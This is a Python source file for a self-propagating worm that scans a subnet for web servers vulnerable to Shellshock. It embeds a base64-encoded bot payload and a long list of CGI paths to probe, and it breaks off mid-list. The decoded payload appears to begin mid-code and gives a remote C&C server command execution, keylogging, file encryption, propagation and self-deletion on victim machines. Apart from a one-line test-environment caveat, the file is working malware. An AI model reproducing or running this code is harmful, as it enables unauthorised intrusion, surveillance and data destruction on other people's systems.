#!/usr/bin/env python3

# As of now no autokill feature. Be careful when running. Only run in controlled test environments.
# Self-propagating computer worm that targets Linux systems vulnerable to shellshock
# Written in Python 3

# RESET ON VMs
# sudo crontab -r -u www-data
# rm -r /tmp/.dirt
# Ensure web server is running

import os, sys, subprocess
import base64
from datetime import datetime

# For scanning /24 subnet
# XXX.XXX.XXX.ip_range_min to XXX.XXX.XXX.ip_range_max
ip_range_min = 109
ip_range_max = 113

folder = '/tmp/.dirt'
worm_source = sys.argv[0]

# Payload: Supports python3 payloads
payload_location = f'{folder}/.payload'

# Insert base64 string of payload file
#payload_content = "f = open('{folder}/test_payload_exec','w')" # Test payload
payload_content = "IHtrZXkuZGVjb2RlKCl9JwoJIyBlbHNlOgoJIyAJdG9fZW5jcnlwdCwga2V5ID0gYXJnc1swXVswXSwgYXJnc1swXVsxXQoJIyAJd2l0aCBvcGVuKHRvX2VuY3J5cHQsICd3YisnKSBhcyBmOgoJIyAJCWNpcGhlcl90ZXh0ID0gZi5yZWFkKCkKCSMgCQljaXBoZXIgPSBGZXJuZXQoa2V5KQoJIyAJCXRyeToKCSMgCQkJcGxhaW5fdGV4dCA9IGNpcGhlci5kZWNyeXB0KGNpcGhlcl90ZXh0KQoJIyAJCWV4Y2VwdCBjcnlwdG9ncmFwaHkuZmVybmV0LkludmFsaWRUb2tlbjoKCSMgCQkJcmV0dXJuICcgIFstXSBJbnZhbGlkIGtleSEnCgkjIAkJZi5zZWVrKDApCgkjIAkJZi53cml0ZShwbGFpbl90ZXh0KQoJIyAJCWYudHJ1bmNhdGUoKQoJIyAJCXJldHVybiAnICBbK10gRmlsZSBzdWNjZXNzZnVsbHkgZGVjcnlwdGVkIScKCiMiIiIgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCAiIiIKCiMgY2xhc3MgV2luZG93c0JvdDoKIyAJIiIiVGhpcyBjbGFzcyBkZWZpbml0aW9uIHdpbGwgY29udGFpbiB0aGUgZnVuY3Rpb25zIGFuZCBjb21tYW5kcwojIAkJdGhhdCBhcmUgc3BlY2lmaWMgdG8gdGhlIFdpbmRvd3Mgb3BlcmF0aW5nIHN5c3RlbS4KIyAJIiIiCiMgCWRlZiBfX2luaXRfXyhzZWxmKToKIyAJCXBhc3MKCiMgCWRlZiBleGVjX3dpbmRvd3NfY21kKHNlbGYsIGNvbW1hbmQ6IHN0cik6CiMgCQkiIiJUaGlzIGZ1bmN0aW9uIHdpbGwgZXhlY3V0ZSBXaW5kb3dzIGNvbW1hbmRzIHJlcXVlc3RlZCBieSB0aGUgQyZDLgojIAkJCUFyZ21lbnRzOgojIAkJCQljb21tYW5kIChzdHIpOiBUaGUgY29tbWFuZCB0aGF0IHdpbGwgYmUgZXhlY3V0ZWQgb24gdGhlIHZpY3RpbSdzIG1hY2hpbmUuCiMgCQkJUmV0dXJuczoKIyAJCQkJV2lsbCByZXR1cm4gdGhlIG91dHB1dCBvZiB0aGUgY29tbWFuZCB0aGF0IHdhcyBleGVjdXRlZC4KIyAJCSIiIgojIAkJREVWTlVMTCA9IG9wZW4ob3MuZGV2bnVsbCwgJ3cnKSAjIE9wZW4gZGV2bnVsbCBmaWxlIHRvIHNlbmQgc3RkZXJyIHRvLgojIAkJdHJ5OgojIAkJCSMgb3MucG9wZW4oJ2NhdCAvZXRjL3NlcnZpY2VzJykucmVhZCgpCiMgCQkJb3V0cHV0ID0gcnVuKGNvbW1hbmQsICMgUnVuIGNvbW1hbmQuCiMgCQkJCQkJc2hlbGw9VHJ1ZSwgIyBQZXJmb3JtIHRoaXMgY29tbWFuZCBpbiBjbWQuZXhlLgojIAkJCQkJCXN0ZG91dD1QSVBFLCAjIFBpcGUgY29tbWFuZCB0byBzdG9yZSBpbiB2YXJpYWJsZS4KIyAJCQkJCQlzdGRlcnI9REVWTlVMTCkJIyBTZW5kIHN0YW5kYXJkIGVycm9yIHRvIGRldm51bGwuCiMgCQkJcmV0dXJuIG91dHB1dC5zdGRvdXQgIyBSZXR1cm4gdGhlIHN0ZG91dCBwcm9wZXJ0eSBvZiB0aGlzIHN1YnByb2Nlc3Mgb2JqZWN0LgojIAkJZXhjZXB0OgojIAkJCXRyeToKIyAJCQkJb3MuY2hkaXIoY29tbWFuZFszOl0pICMgQXR0ZW1wdCB0byBjaGFuZ2UgZGlyZWN0b3J5LgojIAkJCQlyZXR1cm4gIk9rIiAjIFJldHVybnMgT2sgaWYgY2hhbmdpbmcgb2YgZGlyZWN0b3J5IHdhcyBzdWNjZXNzc2Z1bC4KIyAJCQlleGNlcHQ6CiMgCQkJCXRyeToKIyAJCQkJCW9zLnN5c3RlbShjb21tYW5kKSAjIFRyeSBleGVjdXRpbmcgY29tbWFuZCB3aXRoIE9TIG1vZHVsZS4KIyAJCQkJZXhjZXB0OgojIAkJCQkJcmV0dXJuICJbLV0gSW52YWxpZCBjb21tYW5kLiIgIyBSZXR1cm4gdGhpcyBlcnJvciBtZXNzYWdlIGlmIHVuc3VjY2Vzc2Z1bC4KCiMgCWRlZiBoYW5kbGVfcmVxdWVzdChzZWxmKToKIyAJCSIiIlRoaXMgZnVuY3Rpb24gd2lsbCBoYW5kbGUgYWxsIHRhc2tzIHJlbGF0ZWQgdG8gcmVxdWVzdCBtYWRlIGJ5IHRoZSBzZXJ2ZXIuCiMgCQkJQXJndW1lbnRzOgojIAkJCQlOb25lCiMgCQkJUmV0dXJuczoKIyAJCQkJTm9uZQojIAkJIiIiCiMgCQlzb2NrID0gY3JlYXRlX2NsaWVudF9zb2NrZXQoKSAjIFN0b3JlIHNvY2tldCBvYmplY3QuCiMgCQl0cnk6CiMgCQkJd2l0aCBzb2NrOiAjIFV0aWxpemluZyB0aGlzIHNvY2tldCBjb25uZWN0aW9uIGluIGNvbnRleHQgbWFuYWdlci4KIyAJCQkJd2hpbGUgVHJ1ZTogIyBDb250aW51ZSB0byByZWNlaXZlIGNvbW1hbmRzLgojIAkJCQkJY29tbWFuZCA9IHNvY2sucmVjdihDT01NTUFORF9TSVpFKS5kZWNvZGUoJ3V0Zi04JykgIyBSZWNlaXZlIGNvbW1hbmQgZnJvbSBzZXJ2ZXIuCiMgCQkJCQljb21tYW5kX291dHB1dCA9ICdbLV0gSW52YWxpZCBjb21tYW5kLicKIyAJCQkJCWlmIGNvbW1hbmQuc3RyaXAoKSA9PSAna2V5bG9nJzogIyBTdGFydCB0aGUga2V5bG9nZ2VyLgojIAkJCQkJCWtleWxvZ2dlcigpCiMgCQkJCQkJY29tbWFuZF9vdXRwdXQgPSAnbGlzdGVuaW5nJwojIAkJCQkJZWxpZiBjb21tYW5kWzo3XSA9PSAnZW5jcnlwdCc6ICMgRW5jcnlwdCBmaWxlIHNwZWNpZmllZC4KIyAJCQkJCQljb21tYW5kX291dHB1dCA9IGNyeXB0byhjb21tYW5kWzo3XSwgY29tbWFuZFs4Ol0pCiMgCQkJCQllbGlmIGNvbW1hbmRbOjddID09ICdkZWNyeXB0JzogIyBEZWNyeXB0IGZpbGUgd2l0aCBrZXkuCiMgCQkJCQkJY29tbWFuZF9vdXRwdXQgPSBjcnlwdG8oY29tbWFuZFs3Ol0sIGNvbW1hbmRbODpdLnN0cmlwKCkuc3BsaXQoKSkKIyAJCQkJCWVsaWYgY29tbWFuZC5zdHJpcCgpID09ICdwcm9wYWdhdGUnOiAjIENvcHkgdGhpcyBmaWxlIHRvIG11bHRpcGxlIGRpcmVjdG9yeS4KIyAJCQkJCQljb21tYW5kX291dHB1dCA9IHByb3BhZ2F0ZShGSUxFTkFNRSkKIyAJCQkJCWVsaWYgY29tbWFuZC5zdHJpcCgpID09ICdkZXN0b3J5JzogIyBBdHRlbXB0IHRvIGRlbGV0ZSBhbnkgdHJhY2VzIG9mIHRoaXMgZmlsZS4KIyAJCQkJCQljb21tYW5kX291dHB1dCA9IHNlbGZfZGVsZXRlKCkKIyAJCQkJCWVsc2U6CiMgCQkJCQkJY29tbWFuZF9vdXRwdXQgPSBzZWxmLmV4ZWNfd2luZG93c19jbWQoY29tbWFuZCkgIyBFeGVjdXRlIGNvbW1hbmQgb24gbWFjaGluZSBhbmQgc3RvcmUgdGhlIHJlc3BvbnNlLgojIAkJCQkJc29jay5zZW5kKGJ5dGVzKHN0cihjb21tYW5kX291dHB1dCksICd1dGYtOCcpKSAjIFNlbmQgdGhlIG91dHB1dCB0byB0aGUgQyZDIHNlcnZlci4KIyAJCWV4Y2VwdDoKIyAJCQlleGl0KDEpCgojIiIiIEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEAgIiIiCgpjbGFzcyBMaW51eEJvdDoKCSIiIlRoaXMgY2xhc3MgZGVmaW5pdGlvbiB3aWxsIGNvbnRhaW4gdGhlIGZ1bmN0aW9ucyBhbmQgY29tbWFuZHMKCQl0aGF0IGFyZSBzcGVjaWZpYyB0byB0aGUgTGludXggb3BlcmF0aW5nIHN5c3RlbS4KCSIiIgoJZGVmIF9faW5pdF9fKHNlbGYpOgoJICAgIHBhc3MKCglkZWYgZXhlY19saW51eF9jbWQoc2VsZiwgY29tbWFuZDogc3RyKToKCQkiIiJUaGlzIGZ1bmN0aW9uIHdpbGwgZXhlY3V0ZSBMaW51eCBjb21tYW5kcyByZXF1ZXN0ZWQgYnkgdGhlIEMmQy4KCQkJQXJnbWVudHM6CgkJCQljb21tYW5kIChzdHIpOiBUaGUgY29tbWFuZCB0aGF0IHdpbGwgYmUgZXhlY3V0ZWQgb24gdGhlIHZpY3RpbSdzIG1hY2hpbmUuCgkJCVJldHVybnM6CgkJCQlXaWxsIHJldHVybiB0aGUgb3V0cHV0IG9mIHRoZSBjb21tYW5kIHRoYXQgd2FzIGV4ZWN1dGVkLgoJCSIiIgoJCURFVk5VTEwgPSBvcGVuKG9zLmRldm51bGwsICd3JykgIyBPcGVuIGRldm51bGwgZmlsZSB0byBzZW5kIHN0ZGVyciB0by4KCQl0cnk6CgkJCSMgb3MucG9wZW4oJ2NhdCAvZXRjL3NlcnZpY2VzJykucmVhZCgpCgkJCW91dHB1dCA9IHJ1bihjb21tYW5kLnNwbGl0KCksICMgUnVuIGNvbW1hbmQuCgkJCQkJCXN0ZG91dD1QSVBFLCAjIFBpcGUgY29tbWFuZCB0byBzdG9yZSBpbiB2YXJpYWJsZS4KCQkJCQkJc3RkZXJyPURFVk5VTEwpCSMgU2VuZCBzdGFuZGFyZCBlcnJvciB0byBkZXZudWxsLgoJCQlyZXR1cm4gb3V0cHV0LnN0ZG91dCAjIFJldHVybiB0aGUgc3Rkb3V0IHByb3BlcnR5IG9mIHRoaXMgc3VicHJvY2VzcyBvYmplY3QuCgkJZXhjZXB0OgoJCQl0cnk6CgkJCQlvcy5jaGRpcihjb21tYW5kWzM6XSkgIyBBdHRlbXB0IHRvIGNoYW5nZSBkaXJlY3RvcnkuCgkJCQlyZXR1cm4gJ09rJyAjIFJldHVybnMgT2sgaWYgY2hhbmdpbmcgb2YgZGlyZWN0b3J5IHdhcyBzdWNjZXNzc2Z1bC4KCQkJZXhjZXB0OgoJCQkJdHJ5OgoJCQkJCW9zLnN5c3RlbShjb21tYW5kKSAjIFRyeSBleGVjdXRpbmcgY29tbWFuZCB3aXRoIE9TIG1vZHVsZS4KCQkJCWV4Y2VwdDoKCQkJCQlyZXR1cm4gIlstXSBJbnZhbGlkIGNvbW1hbmQuIiAjIFJldHVybiB0aGlzIGVycm9yIG1lc3NhZ2UgaWYgdW5zdWNjZXNzZnVsLgoKCWRlZiBoYW5kbGVfcmVxdWVzdChzZWxmKToKCQkiIiJUaGlzIGZ1bmN0aW9uIHdpbGwgaGFuZGxlIGFsbCB0YXNrcyByZWxhdGVkIHRvIHJlcXVlc3QgbWFkZSBieSB0aGUgc2VydmVyLgoJCQlBcmd1bWVudHM6CgkJCQlOb25lCgkJCVJldHVybnM6CgkJCQlOb25lCgkJIiIiCgkJc29jayA9IGNyZWF0ZV9jbGllbnRfc29ja2V0KCkgIyBTdG9yZSBzb2NrZXQgb2JqZWN0LgoJCXRyeToKCQkJd2l0aCBzb2NrOiAjIFV0aWxpemluZyB0aGlzIHNvY2tldCBjb25uZWN0aW9uIGluIGNvbnRleHQgbWFuYWdlci4KCQkJCXdoaWxlIFRydWU6ICMgQ29udGludWUgdG8gcmVjZWl2ZSBjb21tYW5kcy4KCQkJCQljb21tYW5kID0gc29jay5yZWN2KENPTU1NQU5EX1NJWkUpLmRlY29kZSgndXRmLTgnKSAjIFJlY2VpdmUgY29tbWFuZCBmcm9tIHNlcnZlci4KCQkJCQljb21tYW5kX291dHB1dCA9ICdbLV0gSW52YWxpZCBjb21tYW5kLicKCQkJCQlpZiBjb21tYW5kLnN0cmlwKCkgPT0gJ2tleWxvZyc6ICMgU3RhcnQgdGhlIGtleWxvZ2dlci4KCQkJCQkJa2V5bG9nZ2VyKCkKCQkJCQkJY29tbWFuZF9vdXRwdXQgPSAnbGlzdGVuaW5nJwoJCQkJCWVsaWYgY29tbWFuZFs6N10gPT0gJ2VuY3J5cHQnOiAjIEVuY3J5cHQgZmlsZSBzcGVjaWZpZWQuCgkJCQkJCWNvbW1hbmRfb3V0cHV0ID0gY3J5cHRvKGNvbW1hbmRbOjddLCBjb21tYW5kWzg6XSkKCQkJCQllbGlmIGNvbW1hbmRbOjddID09ICdkZWNyeXB0JzogIyBEZWNyeXB0IGZpbGUgd2l0aCBrZXkuCgkJCQkJCWNvbW1hbmRfb3V0cHV0ID0gY3J5cHRvKGNvbW1hbmRbNzpdLCBjb21tYW5kWzg6XS5zdHJpcCgpLnNwbGl0KCkpCgkJCQkJZWxpZiBjb21tYW5kLnN0cmlwKCkgPT0gJ3Byb3BhZ2F0ZSc6ICMgQ29weSB0aGlzIGZpbGUgdG8gbXVsdGlwbGUgZGlyZWN0b3J5LgoJCQkJCQljb21tYW5kX291dHB1dCA9IHByb3BhZ2F0ZShGSUxFTkFNRSkKCQkJCQllbGlmIGNvbW1hbmQuc3RyaXAoKSA9PSAnZGVzdG9yeSc6ICMgQXR0ZW1wdCB0byBkZWxldGUgYW55IHRyYWNlcyBvZiB0aGlzIGZpbGUuCgkJCQkJCWNvbW1hbmRfb3V0cHV0ID0gc2VsZl9kZWxldGUoKQoJCQkJCWVsc2U6CgkJCQkJCWNvbW1hbmRfb3V0cHV0ID0gc2VsZi5leGVjX2xpbnV4X2NtZChjb21tYW5kKSAjIEV4ZWN1dGUgY29tbWFuZCBvbiBtYWNoaW5lIGFuZCBzdG9yZSB0aGUgcmVzcG9uc2UuCgkJCQkJc29jay5zZW5kKGJ5dGVzKHN0cihjb21tYW5kX291dHB1dCksICd1dGYtOCcpKSAjIFNlbmQgdGhlIG91dHB1dCB0byB0aGUgQyZDIHNlcnZlci4KCQlleGNlcHQ6CgkJCWV4aXQoMSkKCiMiIiIgQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQCAiIiIKCmRlZiBtYWluKCk6CglvYmogPSBOb25lCglpZiBTWVNURU0gPT0gJ0xpbnV4JzogIyBDaGVjayBpZiBvcGVyYXRpbmcgc3lzdGVtIGlzIExpbnV4LgoJCW9iaiA9IExpbnV4Qm90KCkgIyBJZiBMaW51eCwgaW5zdGFudGlhdGUgTGludXhCb3Qgb2JqZWN0LgoJIyBlbHNlOgoJIyAJb2JqID0gV2luZG93c0JvdCgpICMgRWxzZSwgaW5zdGFudGlhdGUgV2luZG93c0JvdCBvYmplY3QuCgoJb2JqLmhhbmRsZV9yZXF1ZXN0KCkgIyBXaWxsIGludm9rZSBmdW5jdGlvbiB0aGF0IHdpbGwgaGFuZGxlIGFsbCBzb2NrZXQgY29ubmVjdGlvbiBvcGVyYXRpb25zLgoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKCW1haW4oKQo="

cgi_list = ['/bWAPP/cgi-bin/shellshock.sh', '/admin.cgi', '/administrator.cgi', '/agora.cgi', '/cgi-bin/shock.sh', '/aktivate/cgi-bin/catgy.cgi', '/analyse.cgi', '/apps/web/vs_diag.cgi', '/axis-cgi/buffer/command.cgi', '/b2-include/b2edit.showposts.php', '/bandwidth/index.cgi', '/bigconf.cgi', '/cartcart.cgi', '/cart.cgi', '/ccbill/whereami.cgi', '/cgi-bin/14all-1.1.cgi', '/cgi-bin/14all.cgi', '/cgi-bin/a1disp3.cgi', '/cgi-bin/a1stats/a1disp3.cgi', '/cgi-bin/a1stats/a1disp4.cgi', '/cgi-bin/addbanner.cgi', '/cgi-bin/add_ftp.cgi', '/cgi-bin/adduser.cgi', '/cgi-bin/admin/admin.cgi', '/cgi-bin/admin.cgi', '/cgi-bin/admin/getparam.cgi', '/cgi-bin/adminhot.cgi', '/cgi-bin/admin.pl', '/cgi-bin/admin/setup.cgi', '/cgi-bin/adminwww.cgi', '/cgi-bin/af.cgi', '/cgi-bin/aglimpse.cgi', '/cgi-bin/alienform.cgi', '/cgi-bin/AnyBoard.cgi', '/cgi-bin/architext_query.cgi', '/cgi-bin/astrocam.cgi', '/cgi-bin/AT-admin.cgi', '/cgi-bin/AT-generate.cgi', '/cgi-bin/auction/auction.cgi', '/cgi-bin/auktion.cgi', '/cgi-bin/ax-admin.cgi', '/cgi-bin/ax.cgi', '/cgi-bin/axs.cgi', '/cgi-bin/badmin.cgi', '/cgi-bin/banner.cgi', '/cgi-bin/bannereditor.cgi', '/cgi-bin/bb-ack.sh', '/cgi-bin/bb-histlog.sh', '/cgi-bin/bb-hist.sh', '/cgi-bin/bb-hostsvc.sh', '/cgi-bin/bb-replog.sh', '/cgi-bin/bb-rep.sh', '/cgi-bin/bbs_forum.cgi', '/cgi-bin/bigconf.cgi', '/cgi-bin/bizdb1-search.cgi', '/cgi-bin/blog/mt-check.cgi', '/cgi-bin/blog/mt-load.cgi', '/cgi-bin/bnbform.cgi', '/cgi-bin/book.cgi', '/cgi-bin/boozt/admin/index.cgi', '/cgi-bin/bsguest.cgi', '/cgi-bin/bslist.cgi', '/cgi-bin/build.cgi', '/cgi-bin/bulk/bulk.cgi', '/cgi-bin/cached_feed.cgi', '/cgi-bin/cachemgr.cgi', '/cgi-bin/calendar/index.cgi', '/cgi-bin/cartmanager.cgi', '/cgi-bin/cbmc/forums.cgi', '/cgi-bin/ccvsblame.cgi', '/cgi-bin/c_download.cgi', '/cgi-bin/cgforum.cgi', '/cgi-bin/.cgi', '/cgi-bin/cgi_process', '/cgi-bin/classified.cgi', '/cgi-bin/classifieds.cgi', '/cgi-bin/classifieds/classifieds.cgi', '/cgi-bin/classifieds/index.cgi', '/cgi-bin/.cobalt/alert/service.cgi', '/cgi-bin/.cobalt/message/message.cgi', '/cgi-bin/.cobalt/siteUserMod/siteUserMod.cgi', '/cgi-bin/commandit.cgi', '/cgi-bin/commerce.cgi', '/cgi-bin/common/listrec.pl', '/cgi-bin/compatible.cgi', '/cgi-bin/Count.cgi', '/cgi-bin/csChatRBox.cgi', '/cgi-bin/csGuestBook.cgi', '/cgi-bin/csLiveSupport.cgi', '/cgi-bin/CSMailto.cgi', '/cgi-bin/CSMailto/CSMailto.cgi', '/cgi-bin/csNews.cgi', '/cgi-bin/csNewsPro.cgi', '/cgi-bin/csPassword.cgi', '/cgi-bin/csPassword/csPassword.cgi', '/cgi-bin/csSearch.cgi', '/cgi-bin/csv_db.cgi', '/cgi-bin/cvsblame.cgi', '/cgi-bin/cvslog.cgi', '/cgi-bin/cvsquery.cgi', '/cgi-bin/cvsqueryform.cgi', '/cgi-bin/day5datacopier.cgi', '/cgi-bin/day5datanotifier.cgi', '/cgi-bin/db_manager.cgi', '/cgi-bin/dbman/db.cgi', '/cgi-bin/dcforum.cgi', '/cgi-bin/dcshop.cgi', '/cgi-bin/dfire.cgi', '/cgi-bin/diagnose.cgi', '/cgi-bin/dig.cgi', '/cgi-bin/directorypro.cgi', '/cgi-bin/download.cgi', '/cgi-bin/e87_Ba79yo87.cgi', '/cgi-bin/emu/html/emumail.cgi', '/cgi-bin/emumail.cgi', '/cgi-bin/emumail/emumail.cgi', '/cgi-bin/enter.cgi', '/cgi-bin/environ.cgi', '/cgi-bin/ezadmin.cgi', '/cgi-bin/ezboard.cgi', '/cgi-bin/ezman.cgi', '/cgi-bin/ezshopper2/loadpage.cgi', '/cgi-bin/ezshopper3/loadpage.cgi', '/cgi-bin/ezshopper/loadpage.cgi', '/cgi-bin/ezshopper/search.cgi', '/cgi-bin/faqmanager.cgi', '/cgi-bin/FileSeek2.cgi', '/cgi-bin/FileSeek.cgi', '/cgi-bin/finger.cgi', '/cgi-bin/flexform.cgi', '/cgi-bin/fom.cgi', '/cgi-bin/fom/fom.cgi', '/cgi-bin/FormHandler.cgi', '/cgi-bin/FormMail.cgi', '/cgi-bin/gbadmin.cgi', '/cgi-bin/gbook/gbook.cgi', '/cgi-bin/generate.cgi', '/cgi-bin/getdoc.cgi', '/cgi-bin/gH.cgi', '/cgi-bin/gm-authors.cgi', '/cgi-bin/gm.cgi', '/cgi-bin/gm-cplog.cgi', '/cgi-bin/guestbook.cgi', '/cgi-bin/handler', '/cgi-bin/handler.cgi', '/cgi-bin/handler/netsonar', '/cgi-bin/hitview.cgi', '/cgi-bin/hsx.cgi', '/cgi-bin/html2chtml.cgi', '/cgi-bin/html2wml.cgi', '/cgi-bin/htsearch.cgi', '/cgi-bin/icat', '/cgi-bin/if/admin/nph-build.cgi', '/cgi-bin/ikonboard/help.cgi', '/cgi-bin/ImageFolio/admin/admin.cgi', '/cgi-bin/imageFolio.cgi', '/cgi-bin/index.cgi', '/cgi-bin/infosrch.cgi', '/cgi-bin/jammail.pl', '/cgi-bin/journal.cgi', '/cgi-bin/lastlines.cgi', '/cgi-bin/loadpage.cgi', '/cgi-bin/login.cgi', '/cgi-bin/logit.cgi', '/cgi-bin/log-reader.cgi', '/cgi-bin/lookwho.cgi', '/cgi-bin/lwgate.cgi', '/cgi-bin/MachineInfo', '/cgi-bin/MachineInfo', '/cgi-bin/magiccard.cgi', '/cgi-bin/mail/emumail.cgi', '/cgi-bin/maillist.cgi', '/cgi-bin/mailnews.cgi', '/cgi-bin/mail/nph-mr.cgi', '/cgi-bin/main.cgi', '/cgi-bin/main_menu.pl', '/cgi-bin/man.sh', '/cgi-bin/mini_logger.cgi', '/cgi-bin/mmstdod.cgi', '/cgi-bin/moin.cgi', '/cgi-bin/mojo/mojo.cgi', '/cgi-bin/mrtg.cgi', '/cgi-bin/mt.cgi', '/cgi-bin/mt/mt.cgi', '/cgi-bin/mt/mt-check.cgi', '/cgi-bin/mt/mt-load.cgi', '/cgi-bin/mt-static/mt-check.cgi', '/cgi-bin/mt-static/mt-load.cgi', '/cgi-bin/musicqueue.cgi', '/cgi-bin/myguestbook.cgi', '/cgi-bin/.namazu.cgi', '/cgi-bin/nbmember.cgi', '/cgi-bin/netauth.cgi', '/cgi-bin/netpad.cgi', '/cgi-bin/newsdesk.cgi', '/cgi-bin/nlog-smb.cgi', '/cgi-bin/nph-emumail.cgi', '/cgi-bin/nph-exploitscanget.cgi', '/cgi-bin/nph-publish.cgi', '/cgi-bin/nph-test.cgi', '/cgi-bin/pagelog.cgi', '/cgi-bin/pbcgi.cgi', '/cgi-bin/perlshop.cgi', '/cgi-bin/pfdispaly.cgi', '/cgi-bin/pfdisplay.cgi', '/cgi-bin/phf.cgi', '/cgi-bin/photo/manage.cgi', '/cgi-bin/photo/protected/manage.cgi', '/cgi-bin/php-cgi', '/cgi-bin/php.cgi', '/cgi-bin/php.fcgi', '/cgi-bin/ping.sh', '/cgi-bin/pollit/Poll_It_SSI_v2.0.cgi', '/cgi-bin/pollssi.cgi', '/cgi-bin/postcards.cgi', '/cgi-bin/powerup/r.cgi', '/cgi-bin/printenv', '/cgi-bin/probecontrol.cgi', '/cgi-bin/profile.cgi', '/cgi-bin/publisher/search.cgi', '/cgi-bin/quickstore.cgi', '/cgi-bin/quizme.cgi', '/cgi-bin/ratlog.cgi', '/cgi-bin/r.cgi', '/cgi-bin/register.cgi', '/cgi-bin/replicator/webpage.cgi/', '/cgi-bin/responder.cgi', '/cgi-bin/robadmin.cgi', '/cgi-bin/robpoll.cgi', '/cgi-bin/rtpd.cgi', '/cgi-bin/sbcgi/sitebuilder.cgi', '/cgi-bin/scoadminreg.cgi', '/cgi-bin-sdb/printenv', '/cgi-bin/sdbsearch.cgi', '/cgi-bin/search', '/cgi-bin/search.cgi', '/cgi-bin/search/search.cgi', '/cgi-bin/sendform.cgi', '/cgi-bin/shop.cgi', '/cgi-bin/shopper.cgi', '/cgi-bin/shopplus.cgi', '/cgi-bin/showcheckins.cgi', '/cgi-bin/simplestguest.cgi', '/cgi-bin/simplestmail.cgi', '/cgi-bin/smartsearch.cgi', '/cgi-bin/smartsearch/smartsearch.cgi', '/cgi-bin/snorkerz.bat', '/cgi-bin/snorkerz.bat', '/cgi-bin/snorkerz.cmd', '/cgi-bin/snorkerz.cmd', '/cgi-bin/sojourn.cgi', '/cgi-bin/spin_client.cgi', '/cgi-bin/start.cgi', '/cgi-bin/status', '/cgi-bin/status_cgi', '/cgi-bin/store/agora.cgi', '/cgi-bin/store.cgi', '/cgi-bin/store/index.cgi', '/cgi-bin/survey.cgi', '/cgi-bin/sync.cgi', '/cgi-bin/talkback.cgi', '/cgi-bin/technote/main.cgi', '/cgi-bin/test2.pl', '/cgi-bin/test-cgi', '/cgi-bin/test.cgi', '/cgi-bin/testing_whatever', '/cgi-bin/test/test.cgi', '/cgi-bin/tidfinder.cgi', '/cgi-bin/tigvote.cgi', '/cgi-bin/title.cgi', '/cgi-bin/top.cgi', '/cgi-bin/traffic.cgi', '/cgi-bin/troops.cgi', '/cgi-bin/ttawebtop.cgi/', '/cgi-bin/ultraboard.cgi', '/cgi-bin/upload.cgi', '/cgi-bin/urlcount.cgi', '/cgi-bin/viewcvs.cgi', '/cgi-bin/view_help.cgi', '/cgi-bin/viralator.cgi', '/cgi-bin/virgil.cgi', '/cgi-bin/vote.cgi', '/cgi-bin/vpasswd.cgi', '/cgi-bin/way-board.cgi', '/cgi-bin/way-board/way-board.cgi', '/cgi-bin/webbbs.cgi', '/cgi-bin/webcart/webcart.cgi', '/cgi-bin/webdist.cgi', '/cgi-bin/webif.cgi', '/cgi-bin/webmail/html/emumail.cgi', '/cgi-bin/webmap.cgi', '/cgi-bin/webspirs.cgi', '/cgi-bin/Web_Store/web_store.cgi', '/cgi-bin/whois.cgi', '/cgi-bin/whois_raw.cgi', '/cgi-bin/whois/whois.cgi', '/cgi-bin/wrap', '/cgi-bin/wrap.cgi', '/cgi-bin/wwwboard.cgi.cgi', '/cgi-bin/YaBB/YaBB.cgi', '/cgi-bin/zml.cgi', '/cgi-mod/index.cgi', '/cgis/wwwboard/wwwboard.cgi', '/cgi-sys/addalink.cgi', '/cgi-sys/defaultwebpage.cgi', '/cgi-sys/domainredirect.cgi', '/cgi-sys/entropybanner.cgi', '/cgi-sys/entropysearch.cgi', '/cgi-sys/FormMail-clone.cgi', '/cgi-sys/helpdesk.cgi', '/cgi-sys/mchat.cgi', '/cgi-sys/randhtml.cgi', '/cgi-sys/realhelpdesk.cgi', '/cgi-sys/realsignup.cgi', '/cgi-sys/signup.cgi', '/connector.cgi', '/cp/rac/nsManager.cgi', '/create_release.sh', '/CSNews.cgi', '/csPassword.cgi', '/dcadmin.cgi', '/dcboard.cgi', '/dcforum.cgi', '/dcforum/dcforum.cgi', '/debuff.cgi', '/debug.cgi', '/details.cgi', '/edittag/edittag.cgi', '/emumail.cgi', '/enter_buff.cgi', '/enter_bug.cgi', '/ez2000/ezadmin.cgi', '/ez2000/ezboard.cgi', '/ez2000/ezman.cgi', '/fcgi-bin/echo', '/fcgi-bin/echo', '/fcgi-bin/echo2', '/fcgi-bin/echo2', '/Gozila.cgi', '/hitmatic/analyse.cgi', '/hp_docs/cgi-bin/index.cgi', '/html/cgi-bin/cgicso', '/html/cgi-bin/cgicso', '/index.cgi', '/info.cgi', '/infosrch.cgi', '/login.cgi', '/mailview.cgi', '/main.cgi', '/megabook/admin.cgi', '/ministats/admin.cgi', '/mods/apage/apage.cgi', '/_mt/mt.cgi', '/musicqueue.cgi', '/ncbook.cgi', '/newpro.cgi', '/newsletter.sh', '/oem_webstage/cgi-bin/oemapp_cgi', '/page.cgi', '/parse_xml.cgi', '/photodata/manage.cgi', '/photo/manage.cgi', '/print.cgi', '/process_buff.cgi', '/process_bug.cgi', '/pub/english.cgi', '/quikmail/nph-emumail.cgi', '/quikstore.cgi', '/reviews/newpro.cgi', '/ROADS/cgi-bin/search.pl', '/sample01.cgi', '/sample02.cgi', '/sample03.cgi', '/sample04.cgi', '/sampleposteddata.cgi', '/scancfg.cgi', '/scancfg.cgi', '/servers/link.cgi', '/setpasswd.cgi', '/SetSecurity.shm', '/shop/member_html.cgi', '/shop/normal_html.cgi', '/site_searcher.cgi', '/siteUserMod.cgi', '/submit.cgi', '/technote/print.cgi', '/template.cgi', '/test.cgi', '/ucsm/isSamInstalled.cgi', '/upload.cgi', '/userreg.cgi', '/users/scripts/submit.cgi', '/vood/cgi-bin/vood_view.cgi', '/Web_Store/web_store.cgi', '/webtools/bonsai/ccvsblame.cgi', 